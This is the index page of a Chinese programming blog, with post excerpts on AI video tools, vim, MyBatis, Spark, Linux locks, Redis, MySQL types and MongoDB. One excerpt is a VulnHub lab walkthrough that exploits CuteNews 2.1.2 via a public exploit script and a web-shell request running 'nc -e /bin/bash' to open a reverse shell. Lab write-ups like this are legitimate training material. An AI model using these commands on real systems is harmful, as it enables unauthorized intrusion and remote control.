<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.133.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大咖的博客">
		<meta property="og:url" content="https://bcdaka.github.io/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="编程大咖">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e68be0af98a4db0c09eec2e6dc888711/" rel="bookmark">
			【AI&#43;视频】个人整理的几款AI文生视频网站工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		端午假期出去浪了几天， 像 快手的文生视频可灵大模型 、 luma的dream-machine 也来了， 截止到现在我所知道的AI文生视频大模型也不少了, 这里简单列一下。 有遗漏难免，排名不分先后， 如果介绍没附图片说明是概念股，你懂得。
1、openai的sora （还在内测，未对外，热度最高，提前关注）
官网地址：https://openai.com/index/sora/
2、pixverse
官网地址：https://pixverse.ai/
这款我之前用的比较多，免费，虽然有水印，去水印分分钟的事情。之前写过一篇文章 【AI+视频】pixverse一款免费的文生视频、图生视频工具 3、Runway
官网地址: https://app.runwayml.com/
Runway是付费工具，尽管提供了免费试用额度，但额外的功能和更长的视频时长需要付费 。Runway Gen2只能生成4秒的视频。
4、Pika
官网地址: https://pika.art/
https:/
5、生数科技的vidu （可申请体验，我的申请还未通过）
官网地址: https://pw.shengshu-ai.com/video
6、haiper 官网地址: https://haiper.ai/
7、万兴天幕（公测中，不知道我排队到什么时候）：
官网地址: https://ailab.wondershare.cn/capability/general/preview/text2video
8、科大讯飞的星火绘镜
官网地址: https://typemovie.art/
9、快手的可灵大模型
官网地址：https://kling.kuaishou.com/ ， 下载快影APP ----- AI创作---- AI生视频（申请体验），想加快申请进度的
填写表单https://survey.corp.kuaishou.com/view/91uw0qu7
10、luma的dream-machine
官网地址：https://lumalabs.ai/dream-machine/creations
这里暂时列10个， 十全十美。
对于程序员来说，需要了解相关视频生成技术，这边推荐
1、github开源的open-Sora 地址：https://github.com/hpcaitech/Open-Sora
2、腾讯的混元-DiT：高性能细粒度中文理解多分辨率扩散Transformer模型
地址：https://github.com/Tencent/HunyuanDiT
我之前写过一篇文章【人工智能资讯】首个中文原生DiT架构，腾讯混元文生图大模型开源，可免费商用
原文链接：【AI+视频】个人整理的几款AI文生视频网站工具
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/deac8ce0db425ecc8f975d8cfccc24c2/" rel="bookmark">
			Linux vim 文本编辑 操作文本 三种模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 vi 是一个经典的行编辑器，支持模式编辑（包括普通模式、插入模式和命令模式）。
vim 保留vi核心功能的基础上，增加了多级撤销、语法高亮、插件支持等高级功能。
两者的最大区别，简单的来说vim就是vi的增强版
三种模式 命令模式（Command Mode）
默认进入的是命令模式。在这个模式下，大部分键击被解释为命令，而不是普通的输入字符。如 删除文本、复制和粘贴文本等操作。例如，dd 可以删除当前行，yy 复制当前行
插入模式（Insert Mode）
主要用于的文本输入。在命令模式下，通过键入 i（插入），a（追加），或 o（新行）等命令，可以进入插入模式。输入的字符都会直接添加到文档中。返回命令模式，只需按下 Esc 键。
底行模式（Last Line Mode） 命令模式下输入冒号（：）切换底行模式，用户输入执行文件保存、退出编辑器、替换文字等操作的命令。例如，:w 用于保存文件，这种模式支持复杂的文件操作和搜索替换功能。:wq 组合命令则用于保存并退出，底行模式的命令执行后，Vim 自动返回命令模式。
语法 vi 文件路径 vim 文件路径 如果路径不存在会自动创建新的文件，存在就进入正常编辑
命令模式命令 i：当前光标位置进入输入模式
a：当前光标位置后进入输入模式
I：当前行进入输入模式
A：当前行结尾进入输入模式
u：撤销修改
ESC ：任意模式回到命令模式下
底行模式命令 :wq 保存退出
:q 退出
:q! 强制退出
:set nu 显示行号
:set paste 设置粘贴模式
搜索文本 命令模式下输入 /666 及代表搜索666
n：焦点到下一个匹配文本
N：焦点到上一个匹配文本
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3160ee6bbc52eb5523e01c460fc6275c/" rel="bookmark">
			Mybatis动态sql标签
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		动态SQL标签简介: MyBatis的一个强大的特性之一通常是它的动态SQL能力。如果你有使用JDBC或其他相似框架的经验,你就明白条件地串联SQL字符串在一起是多么的痛苦,确保不能忘了空格或在列表的最后省略逗号。动态SQL可以彻底处理这种痛苦。
Mybatis中实现动态sql的标签有： &lt;if&gt; &lt;where&gt; &lt;trim&gt; &lt;set&gt; &lt;choose&gt; &lt;foreach&gt;
示例对象（Student）： package com.ffyc.mybatis.model; public class Student { private Integer id; private Integer num;//建议不使用基本类型，使用包装类型，包装类型默认值都是null，后期判断会方便 private String name; private String gender; private Major major;//类与类之间的关联关系 has-a关系 什么有什么，将专业信息封装到专业对象中，减少冗余 public Major getMajor() { return major; } public void setMajor(Major major) { this.major = major; } public Integer getId() { return id; } public void setId(Integer id) { this.id = id; } public Integer getNum() { return num; } public void setNum(Integer num) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3160ee6bbc52eb5523e01c460fc6275c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd83a8198d0f07f3e90dd68cf111b450/" rel="bookmark">
			【Python推导式秘籍】：一行代码的艺术，高效数据处理之道
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 🚋Python推导式🚀一、列表推导式🌈1. 了解推导式❤️2. 实践💥3. 总结 🚀二、字典推导式🌈1. 了解字典推导式❤️2. 实践💥3. 总结 🚀三、集合推导式🌈1. 了解集合推导式❤️2. 实践💥3. 总结 🚀四、生成器推导式🌈1. 了解生成器推导式❤️2. 实践💥3. 总结 🚋Python推导式 🚀一、列表推导式 🌈1. 了解推导式 列表推导式（List Comprehensions）是Python中一种简洁、高效的创建列表的方法。它允许你用一行代码代替多行循环结构来生成新的列表。列表推导式的语法结构紧凑，易于阅读，适用于基于现有列表或者其他可迭代对象生成新列表的场景，特别是当新列表的每个元素都是通过对原列表元素进行某种变换或过滤得到时。
基本语法结构如下：
[expression for item in iterable if condition] expression：是要应用到每个元素上的表达式，用于生成新列表中的元素。item：是每次循环迭代中的当前元素。iterable：是你要遍历的任何可迭代对象，如列表、元组、字符串等。if condition：是可选的筛选条件，只有当条件为真时，对应的元素才会被包含在新列表中。 [ 表达式 for 变量 in 序列 [if 条件] ] # 表达式 是需要进行的操作，可以包括各种数学运算、函数调用、字符串操作等； # 变量 是循环体内部的循环变量，每次循环从 序列 中取出一个元素； # 序列 是需要遍历的对象，可以是列表、元组、字符串等可迭代对象； # if 条件 是可选的条件判断语句，用于对元素进行筛选。 ❤️2. 实践 【示例1】：生成 0 到 9 的平方数列表
# 生成 0 到 9 的平方数列表： squares = [x**2 for x in range(10)] print(squares) # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] 【示例2】：获取一个列表中所有偶数的平方
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd83a8198d0f07f3e90dd68cf111b450/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f51dbe8bf07152cb27cad9670b64f149/" rel="bookmark">
			Spark RDD与算子详解:案例解析(第3天）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 1- RDD的基本介绍（了解）2- 如何构建RDD（熟悉）3- RDD的相关算子(案例详解) (掌握）4- spark RDD算子相关面试题（重点） 文章目录 系列文章目录前言一、RDD的基本介绍（了解）1、什么是RDD2、RDD的五大特性3、RDD的五大特点 二、如何构建RDD（熟悉）1、并行化本地集合方式2、读取外部数据源方式3、处理小文件的操作4、RDD分区数量如何确定 三、RDD的相关算子（掌握）1、RDD算子的分类2、RDD的转换算子2.1 单值类型算子2.2 双值类型算子2.3 KV类型算子 3、RDD的动作算子3.1 KV类型算子 4、RDD的重要算子（重点补充）4.1 基本算子4.2 分区算子4.3 重分区算子4.4 聚合算子4.4.1 单值类型的聚合算子4.4.2 KV类型的聚合算子 4.5 关联算子 四、spark算子相关面试题（重点）1.如何理解RDD,以及RDD的分类2.简单介绍下RDD的五大特性3.简单介绍下RDD的五大特点4.开发中如何小文件处理的方案5.RDD分区数量如何确定6.请说出10个常用的RDD算子以及对应的功能 前言 本文主要详解Spark RDD及工作中常用RDD算子；
一、RDD的基本介绍（了解） 1、什么是RDD ​ RDD：英文全称Resilient Distributed Dataset，叫做弹性分布式数据集，代表一个不可变、可分区、里面的元素可并行计算的分布式的抽象的数据集合。
Resilient弹性：RDD的数据可以存储在内存或者磁盘当中，RDD的数据可以分区Distributed分布式：RDD的数据可以分布式存储，可以进行并行计算Dataset数据集：一个用于存放数据的集合 2、RDD的五大特性 1、（必须的）RDD是由一系列分区组成的 2、（必须的）对RDD做计算，相当于对RDD的每个分区做计算 3、（必须的）RDD之间存在着依赖关系(宽依赖和窄依赖) 4、（可选的）对于KV类型的RDD，默认操作的是k,当然我们可以进行自定义分区方案 5、（可选的）移动数据不如移动计算，让计算程序离数据越近越好 3、RDD的五大特点 1、分区：RDD逻辑上是分区的，仅仅是定义分区的规则，并不是直接对数据进行分区操作，因为RDD本身不存储数据。 2、只读：RDD是只读的，要想改变RDD中的数据，只能在现有的RDD基础上创建新的RDD。 3、依赖：RDD之间存在着依赖关系(宽依赖和窄依赖) 4、cache缓存：如果在应用程序中多次使用同一个RDD，可以将该RDD缓存起来，该RDD只有在第一次计算的时候会根据血缘关系得到分区的数据,后续每次直接从缓存获取即可 5、checkpoint检查点：与缓存类似的，都是可以将中间某一个RDD的结果保存起来，只不过checkpoint支持真正持久化保存 二、如何构建RDD（熟悉） 构建RDD对象的方式主要有两种：
1、通过 parallelize（data）: 通过自定义列表的方式初始化RDD对象。（一般用于测试） 2、通过 textFile（data）: 通过读取外部文件的方式来初始化RDD对象，实际工作中经常使用。 1、并行化本地集合方式 黑窗口中实现:
开发工具实现： # 导包 import os from pyspark import SparkConf, SparkContext # 绑定指定的python解释器 os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f51dbe8bf07152cb27cad9670b64f149/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/447f3eb6266d71217e84ff3bff024c98/" rel="bookmark">
			Linux内核中的锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不同的锁，作用对象是不一样的，也就是作用域不一样
下面分别是作用于临界区、CPU、内存、cache 的各种锁的归纳：
补充：cache是一种缓存，包含硬件缓存（CPU缓存）以及软件缓存（网页缓存，数据缓存）
补充：临界区用于描述一段只能被单个线程或进程在同一时间访问的代码区域。通常，这些代码区域涉及对共享资源的访问
临界区 -&gt; semaphore信号量、Mutex互斥锁、rw-lock读写锁、preempt抢占
CPU -&gt; atomic原子变量、spinlock自旋锁
内存 -&gt; RCU 、Memory Barrier
cache -&gt; Per-CPU
一、atomic原子变量/spinlock自旋锁 — —CPU 既然是锁CPU，那就都是针对多核处理器或多CPU处理器。单核的话，只有发生中断会使任务被抢占，那么可以进入临界区之前先关中断，但是对多核CPU光关中断就不够了，因为对当前CPU关了中断只能使得当前CPU不会运行其它要进入临界区的程序，但其它CPU还是可能执行进入临界区的程序。
(1) atomic原子变量：
所谓原子操作, 就是该操作绝不会在执行完毕前被任何其他任务或事件打断, 也就说, 它是最小的执行单位, 不可能有比它更小的执行单位, 因此这里的原子实际是使用了物理学里的物质微粒的概念。原子操作需要硬件的支持, 因此是架构相关的, 其 API 和原子类型的定义都定义在内核源码树的 include/asm/atomic.h 文件中, 它们都使用汇编语言实现, 因为 C 语言并不能实现这样的操作。原子操作主要用于实现资源计数, 很多引用计数 (refcnt) 就是通过原子操作实现的。
(2) spinlock自旋锁：
当一个线程在获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断的判断锁是否能够被成功获取
#include &lt;linux/spinlock.h&gt; // 定义自旋锁 spinlock_t my_lock; void my_function(void) { spin_lock(&amp;my_lock); // 访问共享资源的操作 spin_unlock(&amp;my_lock); } ps:针对上述进行一些重要问题的阐述，如下所示
互斥锁中，要是当前线程没拿到锁，就会出让CPU；而自旋锁中，要是当前线程没有拿到锁，当前线程在CPU上忙等待直到锁可用，这是为了保证响应速度更快。但是这种线程多了，那意味着多个CPU核都在忙等待，使得系统性能下降。
因此一定不能自旋太久，所以用户态编程里用自旋锁保护临界区的话，这个临界区一定要尽可能小，锁的粒度得尽可能小。
为什么自旋锁的响应速度会比互斥锁更快？
我觉得主要还是作用域的问题 spinlock 主要针对CPU 互斥锁针对作用域 前者直接CPU操作 后者需要内核协助 在小林coding中说到，自旋锁是通过 CPU 提供的 CAS 函数（Compare And Swap），在「用户态」完成加锁和解锁操作，不会主动产生线程上下文切换，所以相比互斥锁来说，会快一些，开销也小一些。 而互斥锁则不是，前面说互斥锁加锁失败，线程会出让CPU，这个过程其实是由内核来完成线程切换的，因此加锁失败时，1）首先从用户态切换至内核态，内核会把线程的状态从「运行」状态设置为「睡眠」状态，然后把 CPU 切换给其他线程运行；2）当互斥锁可用时，之前「睡眠」状态的线程会变为「就绪」状态（要进入就绪队列了），之后内核会在合适的时间，把 CPU 切换给该线程运行。 然后返回用户态。这个过程中，不仅有用户态到内核态的切换开销，还有两次线程上下文切换的开销。 线程的上下文切换主要是线程栈、寄存器、线程局部变量等。 而自旋锁在当前线程获取锁失败时不会进行线程的切换，而是一直循环等待直到获取锁成功。因此，自旋锁不会切换至内核态，也没有线程切换开销。 所以如果这个锁被占有的时间很短，或者说各个线程对临界区是快进快出，那么用自旋锁是开销最小的！ 自旋锁的缺点前面也说了，就是如果自旋久了或者自旋的线程数量多了，CPU的利用率就下降了，因为上面执行的每个线程都在忙等待— —占用了CPU但什么事都没做。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/447f3eb6266d71217e84ff3bff024c98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/786f36d071a2669b18df1347a2ef48af/" rel="bookmark">
			BBS (CUTE): 1.0.2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		BBS (CUTE): 1.0.2 https://www.vulnhub.com/entry/bbs-cute-102,567/
靶场配置网络
登陆时按e 修改rw signie init=/bin/bash 按Ctrl+x 进入 root@(none) 模式
ip add 看到网卡名字叫做ens33
需要修改网卡配置文件
vi /etc/network/interfaces
allow-hotplug ens33
iface ens33 1inet dhcp
重启获得IP地址
使用目录扫描，获得
http://192.168.204.134/index.php
留意到版本号CuteNews 2.1.2 在kali上操作
searchsploit cutenews 2.1.2 看到路径
cp /usr/share/exploitdb/exploits/php/webapps/48800.py ./
修改py配置文件，将所有的/CuteNews删除
执行命令python3 48800.py
输入http://192.168.204.134获得账号名密码
登录BBS (CUTE): 1.0.2，找到注入点
http://192.168.204.134/uploads/avatar_vDnS6Pt85h_vDnS6Pt85h.php?cmd=nc%20-e%20/bin/bash%20192.168.204.135%201234
在kali上连接 nc -lvvp 1234 (从KALI输入访问靶机)
python -c 'import pty;pty.spawn("/bin/bash")'
-c : 执行具体的代码
import ：导入语句
pty ： 终端（接口）
pty.spawn : 执行命令
export TERM=screen
stty rows 45 columns 194 (参考stty -a)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/786f36d071a2669b18df1347a2ef48af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2142607c90e551b9804588538b8ffc36/" rel="bookmark">
			为什么说Python 是胶水语言?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​ "Python 是胶水语言"这一说法是指它很擅长将不同的程序或代码库连接在一起，能够让来自不同编程语言或框架的组件无缝协作。Python 具有丰富的库和简单的语法，使得它可以轻松调用其他语言编写的程序或使用不同技术栈的模块。
​ 以下是几个具体的实例，展示了Python 作为胶水语言的特性：
实例 1：调用 C/C++ 代码 ​ 使用ctypes 库可以方便地调用 C 函数。
假设有一个简单的 C 函数：
// example.c #include &lt;stdio.h&gt; int add(int a, int b) { return a + b; } void say_hello() { printf("Hello, World!\n"); } 采用编译它为共享库：
gcc -shared -o libexample.so -fPIC example.c 然后用 Python 调用这个库：
# example.py import ctypes # 加载共享库 lib = ctypes.CDLL('./libexample.so') # 定义函数原型 lib.add.argtypes = (ctypes.c_int, ctypes.c_int) # 表示该函数接收两个整数参数 lib.add.restype = ctypes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2142607c90e551b9804588538b8ffc36/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5d926cffde71f9d00ce65e4cd67207a/" rel="bookmark">
			springboot与flowable（8）：候选人
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、流程绘制和部署 创建流程图
绘制如下流程图
给人事审批添加候选人
给经理审批添加两个候选人
保存导出流程图
部署流程定义
@Test void contextLoads() { DeploymentBuilder deployment = repositoryService.createDeployment(); deployment.addClasspathResource("process01/HolidayDemo1.bpmn20.xml"); deployment.name("候选人案例"); Deployment deploy = deployment.deploy(); System.out.println("deploy.getId() = " + deploy.getId()); } 二、拾取操作 发起流程
/** * 发起流程 */ @Test public void startProcess() { String id = "HolidayDemo1:1:93caf684-2af9-11ef-910c-644ed7087863"; // 给人事审批候选人进行赋值 Map&lt;String, Object&gt; variables = new HashMap&lt;&gt;(); variables.put("candidate1", "zhangsan"); variables.put("candidate2", "lisi"); variables.put("candidate3", "wangwu"); // 根据流程定义ID启动流程 ProcessInstance processInstance = runtimeService.startProcessInstanceById(id, variables); } 查看act_ru_task表发现assignee字段中审批人是空的。
根据候选人查询待办信息，并将候选人变更为审批人，进行审批。
/** * 根据用户查询待办信息 */ @Test public void findFlow() { List&lt;Task&gt; list = taskService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5d926cffde71f9d00ce65e4cd67207a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc8ea860675ac2ac60f641086c2174ac/" rel="bookmark">
			MacOS安装redis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、介绍二、下载三、安装四、启动五、配置六、Redis 可视化工具下载七、配置详解八、常用命令总结 前言 Redis因其高性能和低延迟而成为现代应用程序的理想选择，尤其适合需要快速读写操作的场景。随着技术的不断发展，Redis继续在性能、功能和易用性方面进行改进。
一、介绍 Redis（Remote Dictionary Server，远程字典服务器）是一个开源的高性能键值对（key-value）数据库。它以其出色的性能、可靠性和灵活性而闻名，在多种场景下被广泛使用，包括缓存、消息队列、排行榜、实时分析等。
redis的特点如下：
内存中数据存储：Redis主要将数据存储在内存中，这使得读写操作非常快速。持久化：尽管Redis是内存数据库，但它提供了持久化机制，可以将内存中的数据保存到磁盘上，防止数据丢失。支持数据结构：Redis支持多种数据结构，包括字符串（strings）、列表（lists）、集合（sets）、有序集合（sorted sets）、散列（hashes）、位图（bitmaps）、超日志（hyperloglogs）和地理空间（geospatial）索引。原子操作：Redis的所有操作都是原子性的，这意味着多个客户端可以同时访问Redis，而不会导致数据竞态或不一致。丰富的特性：Redis提供了发布/订阅机制、事务、Lua脚本、慢查询日志、监视器等高级功能。高可用性：通过Redis Sentinel（哨兵）和Redis Cluster（集群），Redis可以构建高可用的系统，自动处理节点故障和数据分片。横向扩展：Redis Cluster支持数据分片，允许Redis水平扩展，处理更大的数据集和更高的吞吐量。多语言客户端：几乎所有流行的编程语言都有Redis的客户端库，方便开发者集成和使用。社区和生态系统：Redis拥有一个活跃的开发者社区，提供大量的工具、扩展和第三方模块。适用于多种场景：Redis适用于需要快速访问数据的多种应用场景，如会话缓存、全页缓存、实时分析、排行榜、消息队列等。 二、下载 到官网下载： Redis官网地址
访问官方地址，点击 products ,选择 Downloads
鼠标滑到下面，找到 Redis downloads
点击下面的 Install Redis from source 选择对应版本下载
这里我下载了7.0版本的
如果要下载历史其他版本，点击releases page 即可
然后选择对应版本点击下载
三、安装 下载完成后，打开终端
输入命令到 Downloads目录下，如下（每个人的路径都不一样）：
cd /Users/Zhuanz1（需要修改）/Downloads 然后 输入ls 命令查看文件
输入命令进行解压，解压完成后，Downloads下会多一个解压后的文件夹，如下：
tar -zxvf redis-7.0.15.tar.gz 输入命令移动文件到指定目录
sudo mv redis-7.0.15 /usr/local 输入命令进入到redis 目录下进行编译
cd /usr/local/redis-7.0.15/ 输入命令进行编译测试
sudo make test 看到如下提示，编译成功
执行命令安装 redis
sudo make install 看到如下提示，安装成功
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc8ea860675ac2ac60f641086c2174ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bde2769eb1342e4963282aecbeab8298/" rel="bookmark">
			【elementui源码解析】如何实现自动渲染md文档-第三篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.前言
2.webpack.demo.js
3.markdown文档
4.fence.js
1）tokens
2）:::
3）```
5.containers.js
1）markdown-it-container
2）md.use()
3）代码逻辑
4）containers小结
6.congfig.js
1）markdown-it-chain
2）slugify
3）markdown-it-anchor
4）代码逻辑
7.总结
所有章节：
【elementui源码解析】如何实现自动渲染md文档-第一篇【elementui源码解析】如何实现自动渲染md文档-第二篇【elementui源码解析】如何实现自动渲染md文档-第四篇 1.前言 之前我们看了iconInit.js和build-entry.js文件，在build:file命令里还存在node build/bin/i18n.js &amp; node build/bin/version.js这两个命令，在这里我们就不细看了，因为我们主要目的是分析md文档如何自动渲染到页面中的，这两个文件一个是根据模版文件和json配置文件自动生成多语言的主题，另一个是自动生成elementui版本列表。我们接下来主要看webpack.demo.js这个文件，这个文件是webpack打包的配置文件。
图1
2.webpack.demo.js 这个文件里面渲染md文档的主要代码就是这段，自定义了一个md-loader，然后md-loader文件夹里面有几个文件在接下来会一一介绍他们的作用。
图2
3.markdown文档 要看懂这个md-loader文档的代码，还是要对markdown的基本语法有一些了解，在这里可以看下基本语法：Markdown基本语法
其次还有关于markdown-it解析器的api的文档，可以结合着文档和源码来看这些api：markdown-it 中文文档
4.fence.js 首先这个文件覆盖了fence默认的渲染策略。
第3行代码：在很多Markdown解析器中，如markdown-it等，默认的fence渲染策略通常是将代码内容包裹在&lt;pre&gt;&lt;code&gt;标签中，并且根据代码块的语言类型（如javascript），添加对应的CSS类来应用语法高亮。elementui对其进行了覆盖。
图3
图4
第6行代码，可能会疑问这个tokens是什么东西，这是markdown-it解析器实现的数据结构，具体可以看下面例子，我在自己的项目里面加了如下的md文档。首先要了解这样一个前提，解析器是会把md文档的内容转义成HTML的。如图6。
图5
图6 1）tokens 可能会有很多人不清楚tokens是什么，所以我在第7行代码打印了tokens。我截了部分内容如下三张图。比如md文档第一行“## Input 输入框”，在tokens的解析下解析为三个，可以见图7，tag为“h2”，type分别为“heading_open、inline、heading_close”三个，同时对应的nesting的三个值为[-1、0、1]，分别代表开标签、内容、闭标签。
图7 图8
图9
我们主要关注图9，type为“fence”，info为“html”这个token。fence.js这个文件就是主要对type为fence的content进行渲染策略的更改。第9行第10行代码就是在判断是否这个fence是否在demo里面。如果是的话就return第12行的代码来渲染代码到文档里。可以见图10理解。
图10
2）::: ::: 在此上下文中作为自定义区块的开始和结束标记。当Markdown处理器遇到这样的标签时，它会根据预定义的规则来解析和渲染这部分内容，例如将描述作为提示信息显示，并将跟随的代码片段渲染为可交互的演示组件。至于为什么要加demo这个符号，可能是因为elementui的逻辑处理需要demo这个表示符来帮助匹配代码，如代码中的正则表达式，同时也是为后面的自定义容器做的准备。
3）``` 而 ``` 后面加html的原因是为了高亮，在默认的markdown语法中```后面也是可以加一些标识符的，见最后面的图11。至于高亮是怎么实现的，为什么加个slot="highlight"就能高亮，原因是elementui使用了highlight.js这个库，至于具体实现就不深究了。
图11
5.containers.js 1）markdown-it-container markdown-it-container是一个 markdown-it 的插件，它扩展了markdown-it 的功能，允许用户自定义块级语法容器。这意味着你可以定义自己的Markdown语法（通常是一对特定标签，比如elementui的 ```html```），用于包裹内容，并对这些内容应用自定义的渲染逻辑。
2）md.use() md.use()方法用于注册插件，以扩展Markdown解析器的功能。这个文件主要注册了三个自定义的块级容器，demo、tip、warning。只有validate函数通过后才能进入render函数渲染。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bde2769eb1342e4963282aecbeab8298/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cc683554d10597147b898faa9c143c1/" rel="bookmark">
			MySQL 数据类型详解：TINYINT、INT 和 BIGINT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在设计数据库时，选择合适的数据类型对于系统性能和存储效率至关重要。MySQL 提供了多种整数类型来满足不同的存储需求，其中包括 TINYINT、INT 和 BIGINT。本文将详细介绍这三种整数类型的区别、应用场景和使用建议。
1. TINYINT TINYINT 是 MySQL 中存储空间最小的整数类型，适用于只需要存储较小范围整数的字段。
特点:
存储空间: TINYINT 占用 1 个字节。取值范围: 有符号: -128 到 127无符号: 0 到 255 适用场景:
适用于布尔值（0 或 1）的存储。适用于需要储存小范围整数的字段，如状态码、评分等。 示例:
CREATE TABLE example_tinyint ( id TINYINT, status TINYINT UNSIGNED ); 在这个示例中，id 可以存储 -128 到 127 的值，而 status 可以存储 0 到 255 的值。
2. INT INT 是 MySQL 中最常用的整数类型之一，适用于需要存储较大范围整数的字段。
特点:
存储空间: INT 占用 4 个字节。取值范围: 有符号: -2,147,483,648 到 2,147,483,647无符号: 0 到 4,294,967,295 适用场景:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cc683554d10597147b898faa9c143c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bb9b8415643e7c47a2058e7323d9f63/" rel="bookmark">
			【Mongodb-01】Mongodb亿级数据性能测试和压测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mongodb数据性能测试 一，mongodb数据性能测试1，mongodb数据库创建和索引设置2，线程池+批量方式插入数据3，一千万数据性能测试4，两千万数据性能测试5，五千万数据性能测试6，一亿条数据性能测试7，压测8，总结 一，mongodb数据性能测试 如需转载，请标明出处：https://zhenghuisheng.blog.csdn.net/article/details/139505973
之前公司将用户的游戏数据存储在mysql中，就是直接将json数据存储到mysql数据库里面，几个月不到，数据库里面已经有两亿条数据，而且每行中每个json数据量也比较大，导致占用的磁盘容量也比较大，因此为了解决mysql带来多方面的瓶颈，最终选择使用mongodb来代替mysql。为了测试mongodbdb的性能以及是否满足需求，因此做了以下测试，对mongodb在高流量时验证其增删改查的效率，以及对其进行压测
服务器配置：2核4g轻量级服务器 磁盘容量 70GB
每条数据大概在500个字节，索引有一个id主键索引，还有一个parentId和category的联合唯一索引，这里两个字段能保证唯一性，因此用唯一索引效率更优
1，mongodb数据库创建和索引设置 首先在Java代码中创建一个实体类，用这个类作为json对象插入到文档中即可。
@Data public class Archive { private String id; //账号id private String parentId; private String category; private String content; } 随后在mongodb中创建一个数据库，然后再该库下面建立一个名为 archive 的集合，mongodb的集合就是类似于mysql的表，两者概念是一样的。由于后期数据量可能非常大，因此根据mongodb官方文档所说，在数据插入前，尽量提前建立索引，为了满足业务需求，这里选择创建一个联合索引，由于我这边业务能保证要加索引的两个字段的唯一性，因此选择直接添加唯一索引
db.users.createIndex({parentId: 1,category:1}, {unique: true}) 如果navicate操作不方便的话，可以安装一个 Mongodb Compass 可视化工具，如下图，很多操作都是可以在这个可视化图形界面上面直接操作的
2，线程池+批量方式插入数据 由于这边主要是io操作将数据插入，不需要计算之类的，因此选择使用io密集型线程池，接下来自定义一个线程池
@Slf4j public class ThreadPoolUtil { public static ThreadPoolExecutor pool = null; public static synchronized ThreadPoolExecutor getThreadPool() { if (pool == null) { //获取当前机器的cpu int cpuNum = Runtime.
	</div>
	<div class="list__footer clearfix">
